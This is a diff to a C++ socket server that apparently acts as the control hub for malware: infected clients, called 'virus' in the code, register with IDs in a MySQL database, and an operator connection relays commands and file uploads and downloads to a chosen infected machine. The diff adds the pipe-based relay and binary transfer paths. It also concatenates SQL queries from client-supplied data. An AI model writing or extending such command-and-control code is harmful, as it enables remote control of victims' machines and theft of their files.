@@ -20,7 +20,10 @@ struct Connection
     int sock;
 	string client_id;
     sockaddr_in addr;
+	int pipefd[2];
 };
+
+//pthread_cond_t cond = PTHREAD_COND_INITIALIZER;
 
 string itoa(long i)
 {
@@ -86,8 +89,7 @@ int main()
 	setsockopt(sock_server, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));
 
 	struct sockaddr_in addr_server;
-	memset(&addr_server, 0, sizeof(sockaddr_in));
-
+	memset(&addr_server, 0, sizeof(sockaddr_in)); 
 	addr_server.sin_family = AF_INET;
 	addr_server.sin_addr.s_addr = INADDR_ANY;
 	addr_server.sin_port = htons(22222);
@@ -141,7 +143,6 @@ int main()
 	struct sockaddr_in addr;
 	socklen_t addr_len = sizeof(sockaddr_in);
 	Connection* c;
-																				    
 	while((sock = accept(sock_server, (struct sockaddr*)&addr, &addr_len)) >= 0)
 	{
 		c = new Connection();
@@ -159,16 +160,24 @@ int main()
 void *thread_function( void *ptr )
 {
 	Connection* c = (Connection*)ptr;
-	
-	char buf[4096];
+
+
+	//char buf[4096];
     string sendback;
     int res;
-    memset(buf, 0, 4096);
+    //memset(buf, 0, 4096);
 	string error = "";
 	bool login;
 	
-	while((res = recv(c->sock, &buf, 4096, 0)) > 0) {
-		
+	//while((res = recv(c->sock, &buf, 4096, 0)) > 0) {
+	string buf;
+	while(readline(c->sock, buf, 4096) != -1) {
+		if(buf[0] == '#') {
+			write(c->pipefd[1], buf.c_str(), buf.size() + 1);
+			//c->sss << buf << endl;
+			//pthread_cond_signal(&cond);
+		} else {
+
 		// TIME STAMP SECTION //
 		
 		time_t rawtime;
@@ -183,11 +192,12 @@ void *thread_function( void *ptr )
 		
 		// TIME STAMP SECTION END //		
 
-		string data = buf;
-		string buf_new = buf;
+		//string data = buf;
+		//string buf_new = buf;
 		//buf.erase(std::remove(buf.begin(), buf.end(), '\n'), buf.end());
-		buf_new = buf_new.substr(0,buf_new.length()-1);
-		cout << "\t\"" << buf_new << "\"" << endl;
+		//buf_new = buf_new.substr(0,buf_new.length()-1);
+		//cout << "\t\"" << buf_new << "\"" << endl;
+		cout << "\t\"" << buf << "\"" << endl;
 		ss.str("");
 		ss.clear();	
 		ss
@@ -197,7 +207,7 @@ void *thread_function( void *ptr )
 		<< ((c->addr.sin_addr.s_addr & 0xFF000000) >> 24);
 
 		//Unique client ID is 32bit hex string. Client is sending ID in front of the request.
-		cid = data.substr(0,32);
+		cid = buf.substr(0,32);
 		cout << "\tChecking request..." << endl;
 		if(buf[32] == ':') {
 			if(cid == "00000000000000000000000000000000") {
@@ -212,12 +222,12 @@ void *thread_function( void *ptr )
 				("INSERT INTO clients (ip, date, joined, cid) VALUES ('"+ss.str()+"', '"+itoa(time(NULL))+"', '"+itoa(time(NULL))+"', '"+ str +"')").c_str());
 				
 				if(result == 0) {
-					sendback = string() + "#210-OK: id:" + str + "\n";
-		            send(c->sock, sendback.c_str(), sendback.size(), 0);
+					sendback = string() + "#210-OK: id:" + str;
+		            send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 					cout << "\tNew Client '"+ str +"' added.\n" << endl;
 				} else {
-					sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection) + "\n";
-	                send(c->sock, sendback.c_str(), sendback.size(), 0);
+					sendback = string() + "#510-ER: Query failed. " + mysql_error(mConnection);
+	                send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 				}
 				login = true;
 			} else {
@@ -231,14 +241,14 @@ void *thread_function( void *ptr )
 					
 					if(mysql_num_rows(res) == 0) {
 					//MYSQL_ROW row = mysql_fetch_row(res);
-						sendback = string() + "#540-ER: You seem not to have an ID.\n";
-						send(c->sock, sendback.c_str(), sendback.size(), 0);
+						sendback = string() + "#540-ER: You seem not to have an ID.";
+						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 						cout << "\t" << cid  << ": ID not found." << endl;;
 						error += "Client has no ID.\n";
 					} else {
 						cout << "\t#220-OK: " << cid  << " has an ID.\n"  << endl;
-						sendback = string() + "#220-OK: You have an valid ID! Login succeeded.\n";
-						send(c->sock, sendback.c_str(), sendback.size(), 0);
+						sendback = string() + "#220-OK: You have an valid ID! Login succeeded.";
+						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 						c->client_id = cid;	
 
 						update_client();
@@ -249,20 +259,38 @@ void *thread_function( void *ptr )
 
 				} else {
 		
-					if(string(&buf[33]) == "\n") {
-						sendback = string() + "#300-ER: Empty String given.\n";
-						send(c->sock, sendback.c_str(), sendback.size(), 0);
+					if(string(&buf[33]) == "") {
+						sendback = string() + "#300-ER: Empty String given.";
+						send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 					
-					} else if(string(&buf[33]) == "ping\n") {
-						sendback = string()+ "#200-OK: pong\n";
-						send(c->sock, sendback.c_str(), sendback.size(), 0);		
-					} else if(string(&buf[33]) == "test\n") {
-						sendback = string()+ "#230-OK: TEST\n";
-		                send(c->sock, sendback.c_str(), sendback.size(), 0);
-	
+					} else if(string(&buf[33]) == "ping") {
+						sendback = string()+ "#200-OK: pong";
+						send(c->sock, sendback.c_str(), sendback.size()+1, 0);		
+					} else if(string(&buf[33]) == "test") {
+						sendback = string()+ "#230-OK: TEST";
+		                send(c->sock, sendback.c_str(), sendback.size()+1, 0);
+					} else if(string(&buf[33]).substr(0, 4) == "bin:") {
+						long size = atoi(string(&buf[33]).substr(4).c_str());
+						cout << size << endl;
+						char buf[4096];
+						while(size > 0)
+						{
+							if(size > 4096)
+							{
+								recv(c->sock, buf, 4096, 0);
+								write(c->pipefd[1], buf, 4096);
+							}
+							else
+							{
+								recv(c->sock, buf, size, 0);
+								write(c->pipefd[1], buf, size);
+							}
+							size -= 4096;
+						}
+						cout << "OK" << endl;
 					} else {
-						sendback = string()+ "#510-ER: Command not found.\n";
-	                    send(c->sock, sendback.c_str(), sendback.size(), 0);
+						sendback = string()+ "#510-ER: Command not found.";
+	                    send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 						cout << "\t#510-ER: Command not found" << endl; 
 					}
 
@@ -276,13 +304,18 @@ void *thread_function( void *ptr )
 			}	
 			
 		} else {
-            sendback = string() + "#500-ER: Wrong request sent:" +data + "\n";
-            send(c->sock, sendback.c_str(), sendback.size(), 0);
+            sendback = string() + "#500-ER: Wrong request sent:" + buf;
+            send(c->sock, sendback.c_str(), sendback.size()+1, 0);
 			cout << "#500-ER: " << cid << " sent wrong request" << endl;
         }
 
-		memset(buf, 0, 4096);
+		}
 	}
+	sendback = "#340-ER: Virus lost connection";
+	write(c->pipefd[1], sendback.c_str(), sendback.size() + 1);
+	close(c->pipefd[1]);
+	//pthread_cond_signal(&cond);
+
     close(c->sock);
 	
 }
@@ -322,34 +355,100 @@ void* client_thread_function ( void *ptr ) {
 		MYSQL_RES* res = mysql_store_result(mConnection);
 
 		if(mysql_num_rows(res) != 0) {
-			for(int i = 0; i < connections.size(); i++) {
-				Connection* next = connections[i];	
-				if(next->client_id == data) {
-					string sendback = "250-OK: Client exists, connected.\n";
-					send(sock, sendback.c_str(), sendback.size(), 0);
+			int i;
+			for(i = connections.size()-1; i >= 0; i--) {
+				Connection* virus = connections[i];	
+				if(virus->client_id == data) {
+					//pthread_mutex_t mutex;
+					//pthread_mutex_init(&mutex, NULL);
+					//pthread_mutex_lock(&mutex);
 
-					sendback = "#250-OK: Init control mode\n";
-					send(next->sock, sendback.c_str(), sendback.size(), 0); 
+					pipe(virus->pipefd);
+					string sendback = "#240-OK: Client exists, connected.";
+					send(sock, sendback.c_str(), sendback.size()+1, 0);
+
+					//sendback = "#250-OK: Init control mode\n";
+					//send(virus->sock, sendback.c_str(), sendback.size(), 0); 
+
 
 					string client_data;
-					while( readline(sock, client_data, 4096) != -1 ) {
-						client_data += "\n";
-						send(next->sock, client_data.c_str(), client_data.size(), 0);
-						
+					int res = 1;
+					int i = 0;
+					while( readline(sock, client_data, 4096) != -1 && res == 1) {
+						client_data = "#500-CO: " + client_data;
+						send(virus->sock, client_data.c_str(), client_data.size()+1, 0);
+						if(client_data.substr(0, 7) == "upload ")
+						{
+							long size = atoi(client_data.substr(client_data.find(':')).c_str());
+							char buf[4096];
+							while(size > 0)
+							{
+								if(size > 4096)
+								{
+									recv(sock, buf, 4096, 0);
+									send(virus->sock, buf, 4096, 0);
+								}
+								else
+								{
+									recv(sock, buf, size, 0);
+									send(virus->sock, buf, size, 0);
+								}
+								size -= 4096;
+							}
+						}
+							
 						string virus_data;
-						readline(next->sock, virus_data, 4096);
-						send(sock, virus_data.c_str(), virus_data.size(), 0);
-					}					
+						char buf;
+						while((res = read(virus->pipefd[0], &buf, 1)) && buf != 0)
+							virus_data += buf;
+						//while( !getline(virus->sss, virus_data) ) {
+							//cout << "begin " << virus_data << endl;
+							//pthread_cond_wait(&cond, &mutex);
+							//cout << "end" << endl;
+						//}					
+						send(sock, virus_data.c_str(), virus_data.size()+1, 0);
+						if(virus_data.substr(0, 4) == "#600")
+						{
+							long size = atoi(virus_data.substr(virus_data.find(':', 9) + 1).c_str());
+							char buf[4096];
+							while(size > 0)
+							{
+								if(size > 4096)
+								{
+									read(virus->pipefd[0], buf, 4096);
+									send(sock, buf, 4096, 0);
+								}
+								else
+								{
+									read(virus->pipefd[0], buf, size);
+									send(sock, buf, size, 0);
+								}
+								size -= 4096;
+							}
+						}
+					}
+					client_data = "#340-ER: Virus lost connection";
+					send(sock, client_data.c_str(), client_data.size()+1, 0);
+					//pthread_mutex_unlock(&mutex);
+					//pthread_mutex_destroy(&mutex);
+					close(virus->pipefd[0]);
 				}
 			}
+			
+			if(i == -1) {
+				string client_data = "#520-ER: Virus not active";
+				send(sock, client_data.c_str(), client_data.size()+1, 0);
+				
+			}
+
 		} else {
-			string sendback = "#580-ER: This Client was not found in the database.\n";
-			send(sock, sendback.c_str(), sendback.size(), 0);
+			string sendback = "#580-ER: This Client was not found in the database.";	
+			send(sock, sendback.c_str(), sendback.size()+1, 0);
 		}
 		if(send(sock, data.c_str(), data.size(), 0) == -1) break;
-		cout << data << endl;
+		//cout << data << endl;
 	}
-
+	
 }
 
 // PAUSE //
@@ -362,7 +461,7 @@ int readline (int s, string &str, int buffsize)
     for(int i = 0; i < buffsize; i++)
     {
         if(recv(s, &nc, 1, 0) != 1) return -1;
-        if(nc == '\n') return i;
+        if(nc == 0) return i;
         str += nc;
     }
     return str.size();
